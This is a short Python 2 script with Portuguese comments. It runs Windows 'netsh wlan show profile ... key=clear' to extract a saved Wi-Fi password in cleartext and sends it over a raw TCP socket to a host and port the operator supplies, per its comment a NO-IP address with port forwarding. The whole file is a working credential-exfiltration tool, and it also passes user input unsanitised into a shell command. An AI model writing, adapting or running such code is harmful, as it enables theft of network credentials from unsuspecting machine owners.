#!/usr/bin/python
# -*- coding:utf-8 -*-

import socket
import os

ssid = (str(raw_input("Nome da rede: ")))

print "WiFi enviado!"

command = 'netsh wlan show profile %s key=clear | find "Key Content"'%ssid
wifi = "".join(os.popen(command).readlines())

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

noip = "127.0.0.1" #Coloque aqui seu IP local ou NO-IP com encaminhamento de portas
ip = socket.gethostbyname(noip)
port = (int("3030"))

conexao = s.connect((ip,port))
s.send(wifi)
s.close()
